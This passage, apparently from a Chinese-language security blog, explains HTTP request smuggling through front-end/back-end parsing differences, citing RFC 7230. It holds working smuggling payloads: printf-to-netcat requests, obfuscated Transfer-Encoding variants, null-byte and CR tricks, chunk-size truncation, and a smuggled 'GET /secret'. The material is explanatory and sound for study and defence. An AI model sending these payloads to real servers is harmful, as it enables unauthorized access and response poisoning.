“嵌入” 另一个 HTTP 请求，以达到我们“走私”请求的目的，直接表现为我们可以访问内网服务，或者造成一些其他的攻击。</p><h2 id=attack-method>Attack Method</h2><p>既然是基于解析差异，那我们会有什么解析差异呢？场景仍然是上述构架的场景，只不过我们简化一下，把后端服务器固定为一台，就不存在某些概率的情况了。也就是说，架构类似于如下示意图：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>                      User            Front           Backend
</span></span><span class=line><span class=cl>                      |               |               |
</span></span><span class=line><span class=cl>                      |------A-------&gt;|               | 
</span></span><span class=line><span class=cl>                      |               |-------A------&gt;| 
</span></span><span class=line><span class=cl>                      |               |&lt;-A(200)-------|
</span></span><span class=line><span class=cl>                      |&lt;-A(200)-------|               |
</span></span></code></pre></td></tr></table></div></div><p>我们知道 Content-Length 与 Transfer-Encoding 均可以作为 POST 数据传输时处理 body 的方式，为了方便阅读以及码字，我们对字段处理优先规则有以下简写规则：</p><ul><li>CL-TE 代表 Front 以 Content-Length 优先处理，Backend 以 Transfer-Encoding 优先处理</li><li>TE-CL 代表 Front 以 Transfer-Encoding 优先处理，Backend 以 Content-Length 优先处理</li></ul><p>并且 Front 代表的是反向代理等典型的前端服务器，Backend 代表的是处理请求的后端业务服务器，以下均由<code>\r\n</code>代替 CRLF，长度为两个字节。</p><h3 id=chunks-priority-on-content-length>Chunks Priority On Content-Length</h3><p>有些同学可能看到这跟我会有同样的疑惑，对于 CL & TE 解析优先级顺序的问题难道 RFC 文档没有做出规范化嘛？有当然是有的，见 <a class=link href=https://tools.ietf.org/html/rfc7230#section-3.3.3 target=_blank rel=noopener>RFC 7230 Message Body Length</a></p><blockquote><p>​ If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p></blockquote><p>虽然这里是指出了 TL 优先于 CL ，但是我们仍然可以通过一些方式绕过，又或者说，那个中间件的也没有依照这个 RFC 标准规范实现，这就导致了差异性的存在。</p><p>例如我们使用以下代码来发送 HTTP 请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;GET / HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Content-length:56\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Dummy:Header\r\n\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;GET /tmp HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span> nc -q3 127.0.0.1 <span class=m>8080</span>
</span></span></code></pre></td></tr></table></div></div><p>以上正确的解析应该是解析成三个请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Content-length</span><span class=o>:</span><span class=l>56</span>
</span></span><span class=line><span class=cl><span class=n>Transfer-Encoding</span><span class=o>:</span> <span class=l>chunked</span>
</span></span><span class=line><span class=cl><span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>0
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/tmp</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/tests</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>
</span></span></code></pre></td></tr></table></div></div><p>而如果存在 TE & CL 优先级问题的话，会被解析成两个请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET / HTTP/1.1[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>Host:localhost[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>Content-length:56[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>Transfer-Encoding: chunked[CRLF] (ignored and removed, hopefully)
</span></span></span><span class=line><span class=cl><span class=err>Dummy:Header[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>0[CRLF]  (start of 56 bytes of body)
</span></span></span><span class=line><span class=cl><span class=err>[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>GET /tmp HTTP/1.1[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>Host:localhost[CRLF]
</span></span></span><span class=line><span class=cl><span class=err>Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/tests</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span><span class=l>localhost</span>
</span></span><span class=line><span class=cl><span class=n>Dummy</span><span class=o>:</span><span class=l>Header</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=bad-chunked-transmission>Bad Chunked Transmission</h3><p>根据 <a class=link href=https://tools.ietf.org/html/rfc7230#section-3.3.3 target=_blank rel=noopener>RFC7230 section 3.3.3</a> ：</p><blockquote><p>If a Transfer-Encoding header field is present in a request and the chunked transfer coding is not the final encoding, the message body length cannot be determined reliably; the server MUST respond with the 400 (Bad Request) status code and then close the connection.</p></blockquote><p>也就是说当接受到<code>Transfer-Encoding: chunked, zorg</code>的时候，应该返回 400 错误。</p><p>这类可以有很多绕过，比如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Transfer-Encoding: xchunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Transfer-Encoding : chunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Transfer-Encoding: x
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Transfer-Encoding:[tab]chunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GET / HTTP/1.1
</span></span><span class=line><span class=cl> Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>X: X[\n]Transfer-Encoding: chunked
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Transfer-Encoding
</span></span><span class=line><span class=cl> : chunked
</span></span></code></pre></td></tr></table></div></div><h3 id=null-in-headers>Null In Headers</h3><p>在一些用 C 写的中间件服务器当中比较容易产生这个问题，因为<code>\0</code>代表字符串结束标志，当用在 header 里面，如果我们用<code>\0</code>就可能让中间件出现一些不正常的解析。</p><p>比如说：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;GET / HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Content-\0dummy: foo\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;length: 56\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;GET /tmp HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;GET /tests HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span> nc -q3 127.0.0.1 <span class=m>8080</span>
</span></span></code></pre></td></tr></table></div></div><p>有些中间件处理以上的请求时，当遇到<code>\0</code>的时候会继续换行读取，这样也会导致产生解析差异。</p><h3 id=crlf>CRLF</h3><p>根据 <a class=link href=https://tools.ietf.org/html/rfc7230#section-3.5 target=_blank rel=noopener>RFC7320 section-3.5</a>:</p><blockquote><p>Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.</p></blockquote><p>也就是说除了 CRLF 我们还可以用 LF 作为 EOL，但是在 Node.js &lt; 5.6.0 的版本，对于 CRLF 的处理也是比较有趣的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[CR] + ? == [CR][LF]		//true
</span></span></code></pre></td></tr></table></div></div><p>假设我们有一个正常解析 CRLF 的 Front 服务器，后端是有该漏洞的 Node.js 服务，我们可以发送以下请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET / HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host:localhost\r\n
</span></span></span><span class=line><span class=cl><span class=err>Dummy: Header\rZTransfer-Encoding: chunked\r\n
</span></span></span><span class=line><span class=cl><span class=err>Content-length: 52\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span><span class=line><span class=cl><span class=err>0\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span><span class=line><span class=cl><span class=err>GET /tmp HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host:localhost\r\n
</span></span></span><span class=line><span class=cl><span class=err>Dummy:Header\r\n
</span></span></span></code></pre></td></tr></table></div></div><p>Front 服务器就会认为<code>Dummy: Header\rZTransfer-Encoding: chunked\r\n</code>是一个 header ，使用 CL 头解析，会认为这是一个完整的请求，而 Node.js 会认为<code>\rZ</code>是一个换行，按照 TE 优先于 CL 的解析规则，认为这是两个请求，就产生了解析差异。</p><h3 id=size-issue>Size Issue</h3><p>还可以利用一些编码块长度产生解析差异，例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>printf</span> <span class=s1>&#39;GET / HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Dummy:Header\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;0000000000000000000000000000042\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;GET /tmp/ HTTP/1.1\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Host:localhost\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;Transfer-Encoding: chunked\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;0\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>&#39;\r\n&#39;</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=p>|</span> nc -q3 127.0.0.1 <span class=m>8080</span>
</span></span></code></pre></td></tr></table></div></div><p>某些中间件在解析块大小的时候，会将长度块大小长度进行截断，比如这里表现为只取<code>'0000000000000000000000000000042</code>为<code>00000000000000000</code>，这样就会认为这是两个请求了，第一个请求的块大小为0，第二个就会请求<code>/tmp</code>，就导致了 HTTP Smuggling。</p><h3 id=http-version>HTTP Version</h3><p>这个主要是由于 HTTP/0.9 引起的问题，我们先来看看 HTTP 几个版本的 example ：</p><p>HTTP v1.1</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET /foo HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n
</span></span></span></code></pre></td></tr></table></div></div><p>HTTP v1.0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET /foo HTTP/1.0\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span></code></pre></td></tr></table></div></div><p>HTTP v0.9</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /foo\r\n
</span></span></code></pre></td></tr></table></div></div><p>并且 HTTP/0.9 请求包与响应包是都没有 headers 的概念的，也就是说如下：</p><p><img src=https://blogpic.zdy.one/img/20191130142331.png loading=lazy></p><p>因为 HTTP/0.9 响应包没有 headers 的特性，在 HTTP Smuggling 中利用起来也就特别的有意思了。</p><p><img src=https://blogpic.zdy.one/img/20191130143300.png loading=lazy></p><p>这张图的意思就是我们在 HTTP Smuggling 的时候使用 HTTP/0.9 进行 Smuggle ，这并不是 HTTP/0.9 标准的格式，但是由于一些中间件已经不支持直接解析 HTTP/0.9 的标准格式了，但是还可能存在解析这种指定 HTTP version 的情况。于是就可能存在以下这种情况：</p><p><img src=https://blogpic.zdy.one/img/20191130143557.png loading=lazy></p><p><img src=https://blogpic.zdy.one/img/20191130143626.png loading=lazy></p><p>上面两个图展现了一个大致的攻击流程，chewy2.jpg 当中的 24-33664 字节有着一个完整的 HTTP 响应报文，当 Golang 在处理 HTTP/0.9 的时候，由于我们指定了<code>Range: bytes=24-33664</code>，就是我们可以指定获取响应报文的 24-33664 个字节，也就是获取了我们存放在图片当中的 HTTP 报文，然后返回给 Golang ，Golang 对于 HTTP/0.9 再进行标准化去头的处理，这样响应看起来就是一个新的响应了。</p><p><img src=https://blogpic.zdy.one/img/20191130153851.png loading=lazy></p><p>当一个正常用户去请求的时候，如果 Apache 重新使用了 TCP/IP 链接，就会将我们构造在图片当中的 HTTP 报文当作响应包返回给用户。这也是一个很典型的 HTTP Response Splitting 的思路。具体可以看看视频演示 <a class=link href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target=_blank rel=noopener>HTTP Smuggling Examples 2016</a></p><h3 id=has-a-cl-in-get>Has a CL in GET</h3><p>这个场景其实就是在 GET 请求中使用了 body ，并以 Content-Length 指出了 body 的长度。</p><blockquote><p>​ 其实在这里，影响到的并不仅仅是GET请求，所有不携带请求体的HTTP请求都有可能受此影响，只因为GET比较典型，我们把它作为一个例子。</p></blockquote><p>在 <a class=link href=https://tools.ietf.org/html/rfc7230#section-3.3.2 target=_blank rel=noopener>RFC7230 Content-Length</a> 部分提到：</p><blockquote><p>​ For example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body). A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.</p></blockquote><p>在最新的 <a class=link href=https://tools.ietf.org/html/rfc7231#section-4.3.1 target=_blank rel=noopener>RFC7231 4.3.1 GET</a> 中也仅仅提了一句：</p><blockquote><p>​ A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.</p></blockquote><p>对于类似拥有 body 字段并且以 Content-Length 指出其 body 长度的请求，RFC 并没有严格的说明 Server 应该如何去处理，所以大部分中间件对于拥有 body 的 GET 请求也是进行了宽松处理，但是也是部分情况，由于这些中间件没有一个严格的标准依据，所以也会产生解析差异导致 HTTP Smuggling 攻击。</p><p>这里我们举个简单且理想化的例子，Front 服务器对于 GET 请求允许携带 body ，而 Backend 服务器会忽略带 body 的 GET 请求。</p><p>当我们发送如下请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET / HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n
</span></span></span><span class=line><span class=cl><span class=err>Content-Length: 41\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span><span class=line><span class=cl><span class=err>GET /secret HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span></code></pre></td></tr></table></div></div><p>当 Front 服务器处理这个请求的时候，会把以上这个请求当作一个完整的请求转发给 Backend 服务器，而 Backend 服务求在处理这个服务器的时候，会把这个请求当作两个请求</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET / HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n
</span></span></span><span class=line><span class=cl><span class=err>Content-Length: 41\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET /secret HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span></code></pre></td></tr></table></div></div><p>这样我们就可以成功地进行了一次 HTTP Smuggling，从这个例子当中，我们也不难看出，如果有一个场景存在 HTTP Smuggling 漏洞，那么这个 Content-Length 数据就变得额外的重要，因为这影响到我们攻击是否成功，能否将我们的 HTTP 请求成功地“嵌入”在一个 HTTP 请求当中。</p><p>这里的计算方法与之前的类似，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET /secret HTTP/1.1\r\n					--&gt;		&#34;GET /secret HTTP/1.1&#34; 一共20个字符，加上CRLF一共22个字符
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n									--&gt;		&#34;Host: example.com&#34; 一共17个字符，加上CRLF一共19个字符
</span></span></span></code></pre></td></tr></table></div></div><p>22 + 19 = 41 个字节</p><h3 id=two-identical-fields---cl>Two Identical Fields - CL</h3><p>这里我们以 Content-Length 举例，在 <a class=link href=https://tools.ietf.org/html/rfc7230#section-3.3.2 target=_blank rel=noopener>RFC7230 section 3.3.2</a> 中，</p><blockquote><p>If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., &ldquo;Content-Length: 42, 42&rdquo;), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.</p></blockquote><p>And <a class=link href=https://tools.ietf.org/html/rfc7230#section-3.3.3 target=_blank rel=noopener>RFC 7230 section 3.3.3</a> 中也提到：</p><blockquote><p>If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.</p></blockquote><p>RFC 当中对于这中情况也有了比较明确的规范，但是我们这里假设举一个比较简单的例子，我们发送以下请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>GET /suzann.html HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n
</span></span></span><span class=line><span class=cl><span class=err>Content-Length: 0\r\n
</span></span></span><span class=line><span class=cl><span class=err>Content-Length: 46\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span><span class=line><span class=cl><span class=err>GET /walter.html HTTP/1.1\r\n
</span></span></span><span class=line><span class=cl><span class=err>Host: example.com\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span></code></pre></td></tr></table></div></div><p>在这里，我们假设 Front 服务器以第二个 Content-Length 为解析标准，抛弃第一个 Content-Length 字段或者对第一个不做任何处理或者 anything else ，反正假设它只处理第二个 Content-Length 字段；我们在假设 Backend服务器以第一个 Content-Length 字段为解析标准，不理会第二个。</p><p>这样就相当于我们在 HTTP 请求中注入了另一个 HTTP 请求，如果整个场景像我们上述这样，就存在 HTTP Smuggling 攻击。</p><p>如过服务器以第一个 Content-Length 为解析标准，这样解析就会出现两个 HTTP 请求，如果以第二个作为解析标准，则会认为只有一个 HTTP 请求。</p><h3 id=optional-whitespace>Optional WhiteSpace</h3><p>RFC7320 中对于 header 字段有这样的描述：</p><blockquote><p>3.2. Header Fields</p><p>Each header field consists of a case-insensitive field name followed
by a colon (":"), optional leading whitespace, the field value, and
